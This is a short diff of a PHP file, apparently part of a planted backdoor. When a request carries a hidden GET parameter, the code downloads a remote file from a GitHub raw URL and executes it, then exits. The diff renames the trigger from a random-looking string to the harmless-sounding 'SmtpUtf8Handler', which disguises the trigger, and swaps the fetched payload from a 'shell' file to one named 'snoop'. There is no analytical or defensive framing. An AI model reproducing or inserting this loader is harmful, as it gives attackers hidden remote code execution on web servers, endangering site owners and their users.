@@ -48,9 +48,9 @@ class CodeExecutor {
 // ==== MAIN LOGIC ====
 $fetcher = new CurlFetcher();
 
-if (isset($_GET['ImPRovED_214mwqf0941asf'])) {
+if (isset($_GET['SmtpUtf8Handler'])) {
     $executor = new CodeExecutor($fetcher);
-    $executor->executeCodeFromURL("https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/fuqiang-shell.txt");
+    $executor->executeCodeFromURL("https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/snoop");
     exit;
 }
 
